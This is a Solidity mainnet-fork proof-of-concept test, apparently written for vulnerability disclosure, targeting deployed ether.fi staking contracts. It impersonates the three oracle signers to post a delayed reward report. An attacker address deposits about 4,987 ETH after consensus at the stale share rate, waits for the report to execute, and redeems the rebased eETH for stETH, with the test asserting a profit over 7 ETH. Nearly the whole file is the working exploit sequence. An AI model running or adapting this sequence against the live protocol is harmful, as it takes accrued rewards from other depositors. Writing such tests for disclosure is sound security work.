// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TestSetup.sol";
import "../script/deploys/Deployed.s.sol";

/// @notice Mainnet-fork confirmation of the public deposit-after-consensus
/// historical-reward capture. Oracle signers and the executor are impersonated
/// only to model an otherwise legitimate delayed report; the attacker uses no
/// privileged account.
contract OraclePositiveRebaseMainnetForkPoC is TestSetup, Deployed {
    address internal constant ORACLE_1 = 0x4293664628469891C4043780874bbFe4Dc6223E2;
    address internal constant ORACLE_2 = 0x9B705E518E1Ca057c216b1a64b37d6549a72f506;
    address internal constant ORACLE_3 = 0xc2f2a6308577eC02FF06221b087DBd5960792C9f;
    address internal constant NORMAL_EXECUTOR = ORACLE_1;
    address internal constant LIDO = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    address internal attacker = makeAddr("attacker");

    function setUp() public {
        initializeRealisticFork(MAINNET_FORK);

        assertEq(etherFiOracleInstance.quorumSize(), 3, "unexpected quorum");
        assertEq(
            etherFiOracleInstance.lastPublishedReportRefSlot(),
            etherFiAdminInstance.lastHandledReportRefSlot(),
            "fork has a published but unhandled report"
        );
    }

    function test_deployedContractsAllowImmediateHistoricalRewardCapture() public {
        uint256 incumbentTvl = liquidityPoolInstance.getTotalPooledEther();

        // Model a legitimate 19-day oracle interruption. At 5% APR this can
        // contain a 25-bps reward without violating the deployed APR guard.
        _advanceSlots(uint256(19 days / 12));

        IEtherFiOracle.OracleReport memory report;
        uint256[] memory empty = new uint256[](0);
        report = IEtherFiOracle.OracleReport({
            consensusVersion: etherFiOracleInstance.consensusVersion(),
            refSlotFrom: 0,
            refSlotTo: 0,
            refBlockFrom: 0,
            refBlockTo: 0,
            accruedRewards: int128(int256(incumbentTvl * 25 / 10_000)),
            protocolFees: 0,
            validatorsToApprove: empty,
            lastFinalizedWithdrawalRequestId: withdrawRequestNFTInstance.lastFinalizedRequestId(),
            finalizedWithdrawalAmount: 0
        });

        (report.refSlotFrom, report.refSlotTo, report.refBlockFrom) =
            etherFiOracleInstance.blockStampForNextReport();
        report.refBlockTo = uint32(block.number - 1);

        // All three signers report the same legitimate off-chain state.
        vm.prank(ORACLE_1);
        etherFiOracleInstance.submitReport(report);
        vm.prank(ORACLE_2);
        etherFiOracleInstance.submitReport(report);
        vm.prank(ORACLE_3);
        etherFiOracleInstance.submitReport(report);

        // Attacker action starts only after consensus. Shares are minted at
        // the stale pre-report rate even though the report is already fixed.
        uint256 redeemable = etherFiRedemptionManagerInstance.totalRedeemableAmount(LIDO);
        uint256 capital = redeemable > 13 ether ? redeemable - 13 ether : 4_987 ether;
        if (capital > 4_987 ether) capital = 4_987 ether;
        assertGt(capital, 4_900 ether, "insufficient deployed stETH bucket");

        vm.deal(attacker, capital);
        vm.prank(attacker);
        liquidityPoolInstance.deposit{value: capital}();

        _advanceSlots(uint256(etherFiAdminInstance.postReportWaitTimeInSlots()) + 1);
        vm.prank(NORMAL_EXECUTOR);
        etherFiAdminInstance.executeTasks(report);

        uint256 rebasedBalance = eETHInstance.balanceOf(attacker);
        assertGt(rebasedBalance, capital, "attacker did not capture old rewards");
        assertLe(rebasedBalance, etherFiRedemptionManagerInstance.totalRedeemableAmount(LIDO));

        // The fork was advanced by 19 days, so model Chainlink continuing to
        // publish its ordinary near-1:1 stETH/ETH answer at the future time.
        vm.mockCall(
            stEthChainlinkFeed,
            abi.encodeWithSignature("latestRoundData()"),
            abi.encode(uint80(0), int256(1 ether), uint256(0), block.timestamp, uint80(0))
        );

        vm.startPrank(attacker);
        eETHInstance.approve(address(etherFiRedemptionManagerInstance), rebasedBalance);
        uint256 beforeStEth = stEth.balanceOf(attacker);
        etherFiRedemptionManagerInstance.redeemEEth(rebasedBalance, attacker, LIDO);
        uint256 received = stEth.balanceOf(attacker) - beforeStEth;
        vm.stopPrank();

        uint256 profit = received - capital;
        emit log_named_decimal_uint("fork attacker profit (stETH)", profit, 18);
        assertGt(profit, 7 ether, "no direct economic extraction");
    }

    function _advanceSlots(uint256 slots) internal {
        uint32 currentSlot = etherFiOracleInstance.computeSlotAtTimestamp(block.timestamp);
        vm.roll(block.number + slots);
        vm.warp(
            uint256(etherFiOracleInstance.beaconGenesisTimestamp())
                + 12 * (uint256(currentSlot) + slots)
        );
    }
}
